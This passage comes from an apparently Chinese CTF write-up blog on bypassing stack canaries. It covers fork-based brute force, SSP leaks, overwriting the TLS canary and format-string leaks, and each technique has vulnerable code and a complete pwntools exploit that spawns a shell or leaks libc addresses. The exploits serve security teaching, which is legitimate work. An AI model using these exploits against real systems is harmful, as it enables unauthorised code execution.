class="hljs-attribute">p</span>.send(payload)<br>    <span class="hljs-attribute">p</span>.recvuntil(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>)<br>    <span class="hljs-attribute">p</span>.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    <span class="hljs-attribute">p</span>.interactive()<br><span class="hljs-attribute">exp</span>()<br></code></pre></td></tr></table></figure>

<h2 id="Fork子进程程序爆破canary"><a href="#Fork子进程程序爆破canary" class="headerlink" title="Fork子进程程序爆破canary"></a>Fork子进程程序爆破canary</h2><p>Fork函数创建子进程相当于复制一份当前进程，并且其中的内存布局以及变量等，包括canary都与父进程一致<br>那么每次程序挂了，都相当于会再重新开始一遍<br>那我们可以逐位爆破canary，如果程序挂了就说明这一位不对，如果程序正常就可以接着跑下一位，直到爆破出正确的canary</p>
<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>这基本上都是直接从veritas👴👴的blog里摘出来的</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">backdoor</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">setbuf</span>(stdin, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">setbuf</span>(stdout, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">setbuf</span>(stderr, <span class="hljs-literal">NULL</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">vul</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">100</span>];<br>    <span class="hljs-built_in">read</span>(STDIN_FILENO, buffer, <span class="hljs-number">120</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    <span class="hljs-built_in">init</span>();<br>	<span class="hljs-keyword">pid_t</span> pid;<br>	<span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>) &#123;<br>		pid = fork();<br>		<span class="hljs-keyword">if</span>(pid &lt; <span class="hljs-number">0</span>) &#123;<br>			<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;fork error&quot;</span>);<br>			<span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>		&#125;<br>		<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(pid == <span class="hljs-number">0</span>) &#123;<br>			<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;welcome&quot;</span>);<br>			<span class="hljs-built_in">vul</span>();<br>			<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;recv sucess&quot;</span>);<br>		&#125;<br>		<span class="hljs-keyword">else</span> &#123;<br>			<span class="hljs-built_in">wait</span>(<span class="hljs-number">0</span>);<br>		&#125;<br>	&#125;<br>&#125;<br><span class="hljs-comment">//gcc main.c -m32 -o bin</span><br></code></pre></td></tr></table></figure>

<p>然后就硬爆破</p>
<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> pwn import *<br>p = <span class="hljs-built_in">process</span>(<span class="hljs-string">&#x27;./bin&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./bin&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;welcome\n&#x27;</span>)<br>canary = <span class="hljs-string">&#x27;\x00&#x27;</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0x100</span>):<br>        p.<span class="hljs-built_in">send</span>(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">100</span> + canary + chr(i))<br>        <span class="hljs-keyword">a</span> = p.recvuntil(<span class="hljs-string">&#x27;welcome\n&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;recv&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">a</span>:<br>            canary += chr(i)<br>            break<br><br>p.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">100</span> + canary + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">12</span> + p32(<span class="hljs-number">0x80485FB</span>))<br>p.sendline(<span class="hljs-string">&quot;cat flag&quot;</span>)<br>flag = p.recv()<br>p.<span class="hljs-built_in">close</span>()<br><span class="hljs-built_in">log</span>.success(<span class="hljs-string">&#x27;key is:&#x27;</span> + flag)<br><span class="hljs-comment">#  [*] Stopped process &#x27;./bin&#x27; (pid 17747)</span><br><span class="hljs-comment">#  [+] key is:flag&#123;test&#125;</span><br></code></pre></td></tr></table></figure>

<h2 id="SSP-Stack-Smashing-Protect-Leak"><a href="#SSP-Stack-Smashing-Protect-Leak" class="headerlink" title="SSP(Stack Smashing Protect) Leak"></a>SSP(Stack Smashing Protect) Leak</h2><p>这个方法不能getshell，但是可以通过触发canary时的报错信息，来打印出我们想要的内存中的值，例如flag<br>触发canary时会去执行_stack_chk_fail函数，执行这个函数时，会在屏幕上打印这么一段信息<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/7.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/7.png"><span class="image-caption">img</span></a><br>我们分析下__stack_chk_fail的源码<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/5.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/5.png"><span class="image-caption">img</span></a><br>他会调用一个__fortify_fail函数并传入”stack smashing detected”字符串<br>我们接着分析__fortify_fail函数<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/6.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/6.png"><span class="image-caption">img</span></a><br>此处，第一个%s的参数是msg，第二个参数需要判断，如果msg!=NULL，就打印__libc_argv[0]，否则打印”<unknown>”，而argv[0]存储的就是程序名，且这个参数存于栈上，我们只要修改栈上的argv[0]指针为flag的地址，就可以打印出flag</unknown></p>
<h3 id="例题：wdb2018-guess"><a href="#例题：wdb2018-guess" class="headerlink" title="例题：wdb2018_guess"></a>例题：wdb2018_guess</h3><p>分析main函数</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><code class="hljs reasonml">__int64 __fastcall main(__int64 a1, <span class="hljs-built_in">char</span> **a2, <span class="hljs-built_in">char</span> **a3)<br>&#123;<br>  __WAIT_STATUS stat_loc; <span class="hljs-comment">// [rsp+14h] [rbp-8Ch]</span><br>  <span class="hljs-built_in">int</span> v5; <span class="hljs-comment">// [rsp+1Ch] [rbp-84h]</span><br>  __int64 v6; <span class="hljs-comment">// [rsp+20h] [rbp-80h]</span><br>  __int64 v7; <span class="hljs-comment">// [rsp+28h] [rbp-78h]</span><br>  <span class="hljs-built_in">char</span> buf<span class="hljs-literal">[<span class="hljs-number">48</span>]</span>; <span class="hljs-comment">// [rsp+30h] [rbp-70h]</span><br>  <span class="hljs-built_in">char</span> s2<span class="hljs-literal">[<span class="hljs-number">56</span>]</span>; <span class="hljs-comment">// [rsp+60h] [rbp-40h]</span><br>  unsigned __int64 v10; <span class="hljs-comment">// [rsp+98h] [rbp-8h]</span><br><br>  v10 = <span class="hljs-constructor">__readfsqword(0x28u)</span>;<br>  v7 = <span class="hljs-number">3L</span>L;<br>  <span class="hljs-constructor">LODWORD(<span class="hljs-params">stat_loc</span>.<span class="hljs-params">__uptr</span>)</span> = <span class="hljs-number">0</span>;<br>  v6 = <span class="hljs-number">0L</span>L;<br>  sub<span class="hljs-constructor">_4009A6()</span>;<br>  <span class="hljs-constructor">HIDWORD(<span class="hljs-params">stat_loc</span>.<span class="hljs-params">__iptr</span>)</span> = <span class="hljs-keyword">open</span>(<span class="hljs-string">&quot;./flag.txt&quot;</span>, <span class="hljs-number">0</span>, a2);<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-constructor">HIDWORD(<span class="hljs-params">stat_loc</span>.<span class="hljs-params">__iptr</span>)</span><span class="hljs-operator"> == </span>-<span class="hljs-number">1</span> )<br>  &#123;<br>    perror(<span class="hljs-string">&quot;./flag.txt&quot;</span>);<br>    <span class="hljs-constructor">_exit(-1)</span>;<br>  &#125;<br>  read(<span class="hljs-constructor">SHIDWORD(<span class="hljs-params">stat_loc</span>.<span class="hljs-params">__iptr</span>)</span>, buf, <span class="hljs-number">0x30</span>uLL);<br>  close(<span class="hljs-constructor">SHIDWORD(<span class="hljs-params">stat_loc</span>.<span class="hljs-params">__iptr</span>)</span>);<br>  puts(<span class="hljs-string">&quot;This is GUESS FLAG CHALLENGE!&quot;</span>);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( v6 &gt;= v7 )<br>    &#123;<br>      puts(<span class="hljs-string">&quot;you have no sense... bye :-) &quot;</span>);<br>      return <span class="hljs-number">0L</span>L;<br>    &#125;<br>    v5 = sub<span class="hljs-constructor">_400A11()</span>;<br>    <span class="hljs-keyword">if</span> ( !v5 )<br>      break;<br>    ++v6;<br>    wait((__WAIT_STATUS)&amp;stat_loc);<br>  &#125;<br>  puts(<span class="hljs-string">&quot;Please type your guessing flag&quot;</span>);<br>  gets(s2);<br>  <span class="hljs-keyword">if</span> ( !strcmp(buf, s2) )<br>    puts(<span class="hljs-string">&quot;You must have great six sense!!!! :-o &quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    puts(<span class="hljs-string">&quot;You should take more effort to get six sence, and one more challenge!!&quot;</span>);<br>  return <span class="hljs-number">0L</span>L;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>sub_400A11函数</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><code class="hljs mipsasm">__int64 <span class="hljs-keyword">sub_400A11()</span><br><span class="hljs-keyword"></span>&#123;<br>  unsigned int <span class="hljs-built_in">v1</span><span class="hljs-comment">; // [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">v1</span> = fork();<br>  if ( <span class="hljs-built_in">v1</span> == -<span class="hljs-number">1</span> )<br>    err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;can not fork&quot;</span>);<br>  return <span class="hljs-built_in">v1</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>可以看到，fork了一个子进程，并且判断依据是v7的大小，也就是说整个程序可以崩溃3次<br>这姿势和题目我专门写了一篇，思路可以直接看<a href="https://n0vice.top/2020/04/09/Stack-smash/">stack smash</a></p>
<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight autoit"><table><tr><td class="code"><pre><code class="hljs autoit"><span class="hljs-meta">#!/usr/bin/env python</span><br><span class="hljs-meta">#coding=utf-8</span><br>from pwn import*<br>import sys<br><span class="hljs-meta">#context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span></span><br>context.terminal = [<span class="hljs-string">&#x27;terminator&#x27;</span>,<span class="hljs-string">&#x27;-x&#x27;</span>,<span class="hljs-string">&#x27;sh&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>]<br><span class="hljs-built_in">binary</span> = <span class="hljs-string">&#x27;./pwn1&#x27;</span> <br><span class="hljs-keyword">local</span> = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">local</span> == <span class="hljs-number">1</span>:<br>    p=process(<span class="hljs-built_in">binary</span>)<br><span class="hljs-keyword">else</span>:<br>    p=remote(<span class="hljs-string">&quot;&quot;</span>,)<br>elf=ELF(<span class="hljs-built_in">binary</span>)<br>libc=elf.libc<br>def <span class="hljs-built_in">exp</span>():<br>    p.recvuntil(<span class="hljs-string">&quot;flag\n&quot;</span>)<br>    payload = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">296</span> + p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>    p.sendline(payload)<br>    p.recvuntil(<span class="hljs-string">&quot;*** stack smashing detected ***: &quot;</span>)<br>    puts_addr = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[<span class="hljs-number">-6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>    libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>    <span class="hljs-built_in">log</span>.success(<span class="hljs-string">&quot;puts_addr==&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(puts_addr))<br>    <span class="hljs-built_in">log</span>.success(<span class="hljs-string">&quot;libc_base==&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>    environ = libc_base + libc.sym[<span class="hljs-string">&#x27;environ&#x27;</span>]<br>    p.recvuntil(<span class="hljs-string">&quot;flag\n&quot;</span>)<br>    payload = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">296</span> + p64(environ)<br>    p.sendline(payload)<br>    p.recvuntil(<span class="hljs-string">&quot;*** stack smashing detected ***: &quot;</span>)<br>    stack_addr = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[<span class="hljs-number">-6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>    <span class="hljs-built_in">log</span>.success(<span class="hljs-string">&quot;stack_addr==&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(stack_addr))<br>    flag = stack_addr - <span class="hljs-number">0x168</span><br>    p.recvuntil(<span class="hljs-string">&quot;flag\n&quot;</span>)<br>    payload = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">296</span> + p64(flag)<br>    p.sendline(payload)<br>    p.interactive()<br><span class="hljs-built_in">exp</span>()<br></code></pre></td></tr></table></figure>

<h4 id="warn"><a href="#warn" class="headerlink" title="warn"></a>warn</h4><p>需要注意的是，这个方法在glibc2.27及以上的版本中已失效<br>我们继续分析2.27的源码<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/8.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/8.png"><span class="image-caption">img</span></a><br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/9.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/9.png"><span class="image-caption">img</span></a><br>可以看到，执行__fortify_fail_abort函数时多传入了一个need_backtrace参数，而整个参数在前面就已经写死成false了，所以执行__libc_message函数时，第二个参数也被写死成了”<unknown>”字符串，打印不了栈中的信息了</unknown></p>
<h2 id="修改TLS结构体"><a href="#修改TLS结构体" class="headerlink" title="修改TLS结构体"></a>修改TLS结构体</h2><p>我们首先需要知道canary是从<strong>哪里</strong></p>
<p>被取出来的<br>随便查看一个64位的程序，可以看到是从fs指向的位置加上0x28偏移的位置取出来的<br>而初始化canary时，fs寄存器指向的位置就是TLS结构体<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/11.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/11.png"><span class="image-caption">img</span></a><br>这个被定义在glibc/sysdeps/x86_64/nptl/tls.h中结构体tcbhead_t就是用来描述TLS的<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/12.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/12.png"><span class="image-caption">img</span></a><br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/13.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/13.png"><span class="image-caption">img</span></a><br>以上是libc_start_main关于canary生成的过程，_dl_random是内核提供的随机数生成器<br>fs指向的位置加上0x28偏移处的变量uintptr_t stack_chk_guard就是canary的值</p>
<h3 id="例题：-CTF2018-babystack"><a href="#例题：-CTF2018-babystack" class="headerlink" title="例题：*CTF2018 babystack"></a>例题：*CTF2018 babystack</h3><p>分析代码<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/14.png"><img src="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/14.png"><span class="image-caption">img</span></a><br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/15.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/15.png"><span class="image-caption">img</span></a><br>程序在main函数中创建了一个子线程，并在其中调用栈溢出函数，首先输入size，然后读入size大小的字符<br>在多线程中TLS将被放置在多线程的栈的顶部，因此我们能直接通过栈溢出对canary初始值进行更改</p>
<h4 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h4><p>断点在main函数，查看canary的地址，只能发现stack和tls结构体中两个canary的值<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/16.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/16.png"><span class="image-caption">img</span></a><br>再断点到线程函数，搜索canary，会发现tls被初始化了，就是多线程函数在libc上方mmap一段空间用来开辟了一个新的tls结构<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/18.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/18.png"><span class="image-caption">img</span></a><br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/17.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/17.png"><span class="image-caption">img</span></a><br>并且这个tls结构除了canary其他都没有用，这段空间里面的数据都是随便可写的<br>我们可以gdb.attach给canary前的变量断点，然后continue，如果打通了，说明没有遇到断点，即在子线程中canary之前的变量与需要用到的系统调用无关<br>但是需要注意，在canary之前的那几个变量，在正常程序中与系统调用有关，不能直接改写，一般利用数组越界来跳过他们去改写canary<br>i春秋公益CTF_BFnote这题就是利用数组越界跳过它们去改写canary<br>在内存里大概长这样<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/19.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/19.png"><span class="image-caption">img</span></a></p>
<h4 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h4><p>①触发栈溢出，将Canary覆盖为aaaaaaaa，同时使用超长的payload将TLS中的Canary一并覆盖为aaaaaaaa<br>②栈迁移到bss段<br>③ROP</p>
<h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">p</span>=process(<span class="hljs-string">&quot;./bs&quot;</span>)<br><span class="hljs-attribute">libc</span> = ELF(&#x27;/lib/x<span class="hljs-number">86</span>_<span class="hljs-number">64</span>-linux-gnu/libc.so.<span class="hljs-number">6</span>&#x27;)<br><span class="hljs-attribute">context</span>.terminal =<span class="hljs-meta"> [&#x27;terminator&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span><br><br><span class="hljs-attribute">pop_rdi_ret</span> = <span class="hljs-number">0</span>x<span class="hljs-number">400</span>c<span class="hljs-number">03</span><br><span class="hljs-attribute">pop_rsi_r15</span> = <span class="hljs-number">0</span>x<span class="hljs-number">400</span>c<span class="hljs-number">01</span><br><span class="hljs-attribute">read_plt</span>=<span class="hljs-number">0</span>x<span class="hljs-number">4007</span>e<span class="hljs-number">0</span><br><span class="hljs-attribute">puts_got</span>=<span class="hljs-number">0</span>x<span class="hljs-number">601</span>fb<span class="hljs-number">0</span><br><span class="hljs-attribute">put_plt</span>=<span class="hljs-number">0</span>x<span class="hljs-number">4007</span>c<span class="hljs-number">0</span><br><span class="hljs-attribute">buf</span>=<span class="hljs-number">0</span>x<span class="hljs-number">602</span>f<span class="hljs-number">00</span><br><span class="hljs-attribute">leave_ret</span>=<span class="hljs-number">0</span>x<span class="hljs-number">400955</span><br><br><span class="hljs-attribute">payload</span> = p<span class="hljs-number">64</span>(pop_rdi_ret)+p<span class="hljs-number">64</span>(puts_got)+p<span class="hljs-number">64</span>(put_plt)<br><span class="hljs-attribute">payload</span> += p<span class="hljs-number">64</span>(pop_rdi_ret)+p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>)+p<span class="hljs-number">64</span>(pop_rsi_r<span class="hljs-number">15</span>)+p<span class="hljs-number">64</span>(buf+<span class="hljs-number">0</span>x<span class="hljs-number">8</span>)+p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>)+p<span class="hljs-number">64</span>(read_plt)+p<span class="hljs-number">64</span>(leave_ret)<br><br><span class="hljs-attribute">print</span> p.recvuntil(<span class="hljs-string">&quot;How many bytes do you want to send?&quot;</span>)<br><span class="hljs-attribute">p</span>.sendline(str(<span class="hljs-number">6128</span>))<br><span class="hljs-attribute">p</span>.send(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">4112</span>+p<span class="hljs-number">64</span>(buf)+payload+<span class="hljs-string">&quot;a&quot;</span>*(<span class="hljs-number">6128</span>-<span class="hljs-number">4120</span>-len(payload)))<br><br><span class="hljs-attribute">puts_addr</span> = u<span class="hljs-number">64</span>(p.recvuntil(&#x27;\x<span class="hljs-number">7</span>f&#x27;)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,&#x27;\x<span class="hljs-number">00</span>&#x27;))<br><span class="hljs-attribute">libc_base</span> = puts_addr - libc.sym[&#x27;puts&#x27;]<br><span class="hljs-attribute">log</span>.success(<span class="hljs-string">&quot;puts_addr==&gt;&quot;</span> + hex(puts_addr))<br><span class="hljs-attribute">log</span>.success(<span class="hljs-string">&quot;libc_base==&gt;&quot;</span> + hex(libc_base))<br><span class="hljs-attribute">system</span> = libc_base+libc.sym[&#x27;system&#x27;]<br><span class="hljs-attribute">binsh</span> = libc_base+libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>).next()<br><span class="hljs-attribute">log</span>.success(<span class="hljs-string">&quot;system_addr==&gt;&quot;</span> + hex(system))<br><span class="hljs-attribute">log</span>.success(<span class="hljs-string">&quot;binsh==&gt;&quot;</span> + hex(binsh))<br><br><span class="hljs-attribute">p</span>.sendline(p<span class="hljs-number">64</span>(pop_rdi_ret)+p<span class="hljs-number">64</span>(binsh)+p<span class="hljs-number">64</span>(system))<br><span class="hljs-attribute">p</span>.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="格式化字符串leak-canary"><a href="#格式化字符串leak-canary" class="headerlink" title="格式化字符串leak canary"></a>格式化字符串leak canary</h2><p>针对有格式化字符串漏洞的栈溢出程序，利用格式化字符串漏洞可以任意地址读写的特点，泄露出栈上的canary，并填入对应位置，然后利用栈溢出get shell<br>这里我找了一个典型的例题，我们需要计算一下偏移，然后利用%p来泄露canary</p>
<h3 id="例题：ASIS-CTF-Finals-2017-Mary-Morton"><a href="#例题：ASIS-CTF-Finals-2017-Mary-Morton" class="headerlink" title="例题：ASIS-CTF-Finals-2017 Mary_Morton"></a>例题：ASIS-CTF-Finals-2017 Mary_Morton</h3><p>main函数<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/20.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/20.png"><span class="image-caption">img</span></a><br>有选项可以选<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/21.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/21.png"><span class="image-caption">img</span></a><br>选项2有格式化字符串漏洞<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/22.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/22.png"><span class="image-caption">img</span></a><br>选项1有栈溢出漏洞<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/23.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/23.png"><span class="image-caption">img</span></a><br>还有后门<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/24.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/24.png"><span class="image-caption">img</span></a><br>开了canary保护<br>意味着要么溢出去触发canary，要么只能利用一次格式化字符串漏洞读内存<br>我们首先确定到可控输入位于格式化字符串第几个参数<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/25.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/25.png"><span class="image-caption">img</span></a><br>尝试一番可以发现是第6个参数的位置<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/26.png"><img src="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/26.png"><span class="image-caption">img</span></a><br>然后计算出buf和canary之间的距离为0x90-0x8=0x88=136<br>这是个64位程序，8字节为一个单位，136/8=17，那么canary距离格式化字符串函数23（17+6）个参数的距离<br>可以利用%23$p来leak canary<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/27.png"><img src="/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/27.png"><span class="image-caption">img</span></a><br>nice<br>接下来就把canary填入rbp-8的位置然后ret2text就彳亍了</p>
<h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">context</span>.log_level = &#x27;debug&#x27;<br><span class="hljs-attribute">p</span> = process(&#x27;./Mary_Morton&#x27;)<br><span class="hljs-attribute">p</span>.recvuntil(&#x27;<span class="hljs-number">3</span>. Exit the battle&#x27;)<br><span class="hljs-attribute">p</span>.sendline(&#x27;<span class="hljs-number">2</span>&#x27;)<br><span class="hljs-attribute">p</span>.sendline(<span class="hljs-string">&quot;%23$p&quot;</span>)<br><span class="hljs-attribute">p</span>.recvuntil(&#x27;<span class="hljs-number">0</span>x&#x27;)<br><span class="hljs-attribute">canary</span> = int(p.recv(<span class="hljs-number">16</span>),<span 